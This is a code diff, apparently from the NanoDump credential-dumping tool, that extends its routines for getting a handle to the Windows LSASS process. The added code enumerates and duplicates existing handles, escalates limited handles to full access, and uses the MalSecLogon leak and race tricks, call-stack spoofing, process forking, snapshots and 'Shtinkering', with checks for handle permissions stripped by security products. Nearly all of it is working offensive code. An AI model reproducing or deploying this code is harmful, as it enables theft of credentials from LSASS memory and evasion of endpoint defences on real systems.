@@ -3,8 +3,180 @@
 #include "dinvoke.h"
 #include "modules.h"
 #include "malseclogon.h"
+#include "spoof_callstack.h"
 
 #if defined(NANO) && !defined(SSP)
+
+PHANDLE_LIST find_token_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions)
+{
+    BOOL success = FALSE;
+
+    DPRINT("Finding token handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        return NULL;
+    }
+
+    ULONG TokenTypeIndex = 0;
+    success = GetTypeIndexByName(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
+    if (!success)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
+    if (!handleTableInformation)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Token'
+        if (handleInfo->ObjectTypeIndex != TokenTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            intFree(handleTableInformation); handleTableInformation = NULL;
+            intFree(handle_list); handle_list = NULL;
+            return NULL;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    intFree(handleTableInformation); handleTableInformation = NULL;
+    DPRINT("Found %ld handles", handle_list->Count);
+    return handle_list;
+}
+
+PHANDLE_LIST find_process_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions)
+{
+    BOOL success = FALSE;
+
+    DPRINT("Finding process handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        return NULL;
+    }
+
+    ULONG ProcesTypeIndex = 0;
+    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
+    if (!success)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
+    if (!handleTableInformation)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Process'
+        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            intFree(handleTableInformation); handleTableInformation = NULL;
+            intFree(handle_list); handle_list = NULL;
+            return NULL;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    intFree(handleTableInformation); handleTableInformation = NULL;
+    DPRINT("Found %ld handles", handle_list->Count);
+    return handle_list;
+}
+
+/*
+ * Some security products remove permissions from handles
+ * such as PROCESS_VM_READ. Make sure the handle has all
+ * the permissions that we requested
+ */
+BOOL check_handle_privs(
+    IN HANDLE handle,
+    IN DWORD permissions)
+{
+    BOOL ret_val = FALSE;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    PUBLIC_OBJECT_BASIC_INFORMATION obj_info = { 0 };
+
+    status = NtQueryObject_(
+        handle,
+        ObjectBasicInformation,
+        &obj_info,
+        sizeof(PUBLIC_OBJECT_BASIC_INFORMATION),
+        NULL);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtQueryObject", status);
+        goto cleanup;
+    }
+
+    if ((obj_info.GrantedAccess & permissions) == permissions)
+    {
+        ret_val = TRUE;
+        DPRINT(
+            "The handle has the appropiate permissions: 0x%lx",
+            obj_info.GrantedAccess);
+    }
+    else
+    {
+        ret_val = FALSE;
+        DPRINT_ERR(
+            "The handle should have access permissions of 0x%lx but has 0x%lx",
+            permissions,
+            permissions & obj_info.GrantedAccess);
+        PRINT_ERR("Could not open a handle with the requested permissions");
+    }
+
+cleanup:
+    return ret_val;
+}
+
 
 /*
  * "The DuplicateHandle system call has an interesting behaviour
@@ -14,7 +186,8 @@
  * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
  */
 HANDLE make_handle_full_access(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
@@ -26,7 +199,7 @@ HANDLE make_handle_full_access(
         NtCurrentProcess(),
         &hDuped,
         0,
-        0,
+        attributes,
         DUPLICATE_SAME_ACCESS);
 
     NtClose(hProcess); hProcess = NULL;
@@ -34,22 +207,238 @@ HANDLE make_handle_full_access(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDuplicateObject", status);
-        DPRINT_ERR("Could not convert the handle to full access privileges");
         return NULL;
     }
-
-    DPRINT("The handle now has full access privileges");
 
     return hDuped;
 }
 
+// https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html
+HANDLE elevate_handle_via_duplicate(
+    IN HANDLE hProcess,
+    IN ACCESS_MASK DesiredAccess,
+    IN DWORD HandleAttributes)
+{
+    HANDLE hDupPriv = NULL;
+    HANDLE hHighPriv = NULL;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    ULONG options = 0;
+
+    if (!hProcess)
+        goto cleanup;
+
+    if (!DesiredAccess)
+        options = DUPLICATE_SAME_ACCESS;
+
+    status = NtDuplicateObject(
+        NtCurrentProcess(),
+        hProcess,
+        NtCurrentProcess(),
+        &hDupPriv,
+        PROCESS_DUP_HANDLE,
+        FALSE,
+        0);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    status = NtDuplicateObject(
+        hDupPriv,
+        NtCurrentProcess(),
+        NtCurrentProcess(),
+        &hHighPriv,
+        DesiredAccess,
+        HandleAttributes,
+        options);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    DPRINT(
+        "Duplicated handle: 0x%lx -> 0x%lx",
+        (DWORD)(ULONG_PTR)hProcess,
+        (DWORD)(ULONG_PTR)hHighPriv);
+
+cleanup:
+    if (hProcess)
+        NtClose(hProcess);
+    if (hDupPriv)
+        NtClose(hDupPriv);
+
+    return hHighPriv;
+}
+
 // get a handle to LSASS via multiple methods
-HANDLE obtain_lsass_handle(
+BOOL obtain_lsass_handle(
+    OUT PHANDLE phProcess,
+    IN DWORD lsass_pid,
+    IN BOOL duplicate_handle,
+    IN BOOL elevate_handle,
+    IN BOOL duplicate_elevate,
+    IN BOOL use_seclogon_duplicate,
+    IN DWORD spoof_callstack,
+    IN BOOL is_seclogon_leak_local_stage_2,
+    IN LPCSTR seclogon_leak_remote_binary,
+    OUT PPROCESS_LIST* Pcreated_processes,
+    IN BOOL use_valid_sig,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    OUT PHANDLE PhSnapshot,
+    IN BOOL use_seclogon_leak_local,
+    IN BOOL use_seclogon_leak_remote,
+    IN BOOL use_lsass_shtinkering)
+{
+    BOOL   ret_val               = FALSE;
+    BOOL   success               = FALSE;
+    HANDLE hProcess              = NULL;
+    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
+    DWORD  duplicate_permissions = 0;
+    DWORD  attributes            = 0;
+    BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;
+
+    if (!phProcess)
+        return FALSE;
+
+    // --duplicate-elevate is simply --duplicate and --elevate-handle used together
+    if (duplicate_elevate)
+    {
+        elevate_handle = TRUE;
+        duplicate_handle = TRUE;
+    }
+
+    if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
+    {
+        success = malseclogon_handle_leak(
+            seclogon_leak_remote_binary,
+            dump_path,
+            fork_lsass,
+            snapshot_lsass,
+            use_valid_sig,
+            use_lsass_shtinkering,
+            use_seclogon_leak_local,
+            lsass_pid,
+            Pcreated_processes);
+        if (!success)
+            goto cleanup;
+        if (use_seclogon_leak_local)
+            return TRUE;
+    }
+
+    // --seclogon-leak-remote requires --duplicate internaly
+    if (use_seclogon_leak_remote)
+        duplicate_handle = TRUE;
+
+    // LSASS Shtinkering needs the handle to be inheritable
+    if (use_lsass_shtinkering)
+        attributes |= OBJ_INHERIT;
+
+    // fork and snapshot require LSASS_CLONE_PERMISSIONS
+    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
+    {
+        permissions = LSASS_CLONE_PERMISSIONS;
+    }
+    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
+    else if (use_lsass_shtinkering)
+    {
+        permissions = LSASS_SHTINKERING_PERMISSIONS;
+    }
+
+    // remember the permissions we needed
+    duplicate_permissions = permissions;
+
+    // if --elevate-handle was provided, we use PROCESS_QUERY_LIMITED_INFORMATION
+    if (elevate_handle)
+    {
+        permissions = PROCESS_QUERY_LIMITED_INFORMATION;
+    }
+
+    hProcess = open_handle_to_lsass(
+        lsass_pid,
+        permissions,
+        duplicate_handle,
+        use_seclogon_duplicate,
+        spoof_callstack,
+        is_seclogon_leak_local_stage_2,
+        attributes);
+    if (!hProcess)
+        goto cleanup;
+
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+        goto cleanup;
+
+    if (elevate_handle)
+    {
+        hProcess = elevate_handle_via_duplicate(
+            hProcess,
+            duplicate_permissions,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+    else if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering)
+            && use_seclogon_leak)
+    {
+        hProcess = make_handle_full_access(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a fork
+    if (fork_lsass)
+    {
+        hProcess = fork_process(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a snapshot
+    if (snapshot_lsass)
+    {
+        hProcess = snapshot_process(
+            hProcess,
+            PhSnapshot);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+    *phProcess = hProcess;
+
+cleanup:
+    if (!ret_val && hProcess)
+        NtClose(hProcess);
+
+    return ret_val;
+}
+
+
+HANDLE open_handle_to_lsass(
     IN DWORD lsass_pid,
     IN DWORD permissions,
     IN BOOL dup,
+    IN BOOL seclogon_race,
+    IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
-    IN LPCSTR dump_path)
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     // use MalSecLogon to leak a handle to LSASS
@@ -57,8 +446,7 @@ HANDLE obtain_lsass_handle(
     {
         // this is always done from an EXE
 #ifdef EXE
-        hProcess = malseclogon_stage_2(
-            dump_path);
+        hProcess = malseclogon_stage_2();
 #endif
     }
     // duplicate an existing handle to LSASS
@@ -67,7 +455,23 @@ HANDLE obtain_lsass_handle(
         DPRINT("Trying to find an existing " LSASS " handle to duplicate");
         hProcess = duplicate_lsass_handle(
             lsass_pid,
-            permissions);
+            permissions,
+            attributes);
+    }
+    else if (seclogon_race)
+    {
+        hProcess = malseclogon_race_condition(
+            lsass_pid,
+            permissions,
+            attributes);
+    }
+    else if (spoof_callstack)
+    {
+        hProcess = open_handle_with_spoofed_callstack(
+            spoof_callstack,
+            lsass_pid,
+            permissions,
+            attributes);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -76,7 +480,8 @@ HANDLE obtain_lsass_handle(
         hProcess = get_process_handle(
             lsass_pid,
             permissions,
-            FALSE);
+            FALSE,
+            attributes);
     }
     // use NtGetNextProcess until a handle to LSASS is obtained
     else
@@ -85,7 +490,8 @@ HANDLE obtain_lsass_handle(
         // this branch won't be called
         DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
         hProcess = find_lsass(
-            permissions);
+            permissions,
+            attributes);
     }
     if (hProcess)
     {
@@ -96,7 +502,8 @@ HANDLE obtain_lsass_handle(
 
 // use NtGetNextProcess to get a handle to LSASS
 HANDLE find_lsass(
-    IN DWORD dwFlags)
+    IN DWORD dwFlags,
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     NTSTATUS status;
@@ -106,7 +513,7 @@ HANDLE find_lsass(
         status = NtGetNextProcess(
             hProcess,
             dwFlags,
-            0,
+            attributes,
             0,
             &hProcess);
         if (status == STATUS_NO_MORE_ENTRIES)
@@ -129,7 +536,8 @@ HANDLE find_lsass(
 HANDLE get_process_handle(
     IN DWORD dwPid,
     IN DWORD dwFlags,
-    IN BOOL quiet)
+    IN BOOL quiet,
+    IN DWORD attributes)
 {
     NTSTATUS status;
     HANDLE hProcess = NULL;
@@ -138,7 +546,7 @@ HANDLE get_process_handle(
     InitializeObjectAttributes(
         &ObjectAttributes,
         NULL,
-        0,
+        attributes,
         NULL,
         NULL);
     CLIENT_ID uPid = { 0 };
@@ -300,7 +708,6 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
 
         if (NT_SUCCESS(status))
         {
-            DPRINT("Obtained the different types of objects");
             return obj_type_information;
         }
 
@@ -314,6 +721,7 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
 
 // get index of object type 'Process'
 BOOL GetTypeIndexByName(
+    IN LPWSTR handle_type,
     OUT PULONG ProcesTypeIndex)
 {
     POBJECT_TYPES_INFORMATION ObjectTypes;
@@ -329,28 +737,31 @@ BOOL GetTypeIndexByName(
     CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
     for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
     {
-        if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
+        if (!_wcsicmp(CurrentType->TypeName.Buffer, handle_type))
         {
             *ProcesTypeIndex = i + 2;
-            DPRINT("Found the index of type 'Process': %ld", i+2);
+            DPRINT("Found the index of type '%ls': %ld", handle_type, i+2);
+            intFree(ObjectTypes); ObjectTypes = NULL;
             return TRUE;
         }
         CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
     }
     DPRINT_ERR("Index of type 'Process' not found");
+    intFree(ObjectTypes); ObjectTypes = NULL;
     return FALSE;
 }
 
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     NTSTATUS status;
     BOOL success;
 
     ULONG ProcesTypeIndex = 0;
-    success = GetTypeIndexByName(&ProcesTypeIndex);
+    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
     if (!success)
         return NULL;
 
@@ -407,7 +818,8 @@ HANDLE duplicate_lsass_handle(
                 hProcess = get_process_handle(
                     ProcessId,
                     PROCESS_DUP_HANDLE,
-                    TRUE);
+                    TRUE,
+                    0);
                 if (!hProcess)
                     break;
             }
@@ -420,7 +832,7 @@ HANDLE duplicate_lsass_handle(
                 NtCurrentProcess(),
                 &hDuped,
                 0,
-                0,
+                attributes,
                 DUPLICATE_SAME_ACCESS);
             if (!NT_SUCCESS(status))
                 continue;
@@ -453,34 +865,31 @@ HANDLE duplicate_lsass_handle(
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
-    OBJECT_ATTRIBUTES CloneObjectAttributes;
+    OBJECT_ATTRIBUTES attrs = { 0 };
 
-    InitializeObjectAttributes(
-        &CloneObjectAttributes,
-        NULL,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL);
+    InitializeObjectAttributes(&attrs, NULL, attributes, 0, NULL);
 
-    NTSTATUS status = NtCreateProcess(
+    NTSTATUS status = NtCreateProcessEx(
         &hCloneProcess,
         GENERIC_ALL,
-        &CloneObjectAttributes,
+        &attrs,
         hProcess,
-        TRUE,
+        CREATE_SUSPENDED,
         NULL,
         NULL,
-        NULL);
+        NULL,
+        0);
     if (!NT_SUCCESS(status))
     {
-        syscall_failed("NtCreateProcess", status);
+        syscall_failed("NtCreateProcessEx", status);
         DPRINT_ERR("Could not fork " LSASS);
         hCloneProcess = NULL;
     }
@@ -507,7 +916,7 @@ HANDLE snapshot_process(
     DWORD                  thread_flags;
     DWORD                  error_code;
 
-    if (!hProcess)
+    if (!hProcess || !hSnapshot)
         return NULL;
 
     // find the address of PssNtCaptureSnapshot dynamically
@@ -517,7 +926,7 @@ HANDLE snapshot_process(
         0);
     if (!PssNtCaptureSnapshot)
     {
-        DPRINT_ERR("Address of 'PssNtCaptureSnapshot' not found");
+        api_not_found("PssNtCaptureSnapshot");
         return NULL;
     }
 
@@ -549,7 +958,7 @@ HANDLE snapshot_process(
         0);
     if (!PssNtQuerySnapshot)
     {
-        DPRINT_ERR("Address of 'PssNtQuerySnapshot' not found");
+        api_not_found("PssNtQuerySnapshot");
         return NULL;
     }
 
@@ -586,7 +995,7 @@ BOOL free_snapshot(
         0);
     if (!PssNtFreeSnapshot)
     {
-        DPRINT_ERR("Address of 'PssNtFreeSnapshot' not found");
+        api_not_found("PssNtFreeSnapshot");
         return FALSE;
     }
 
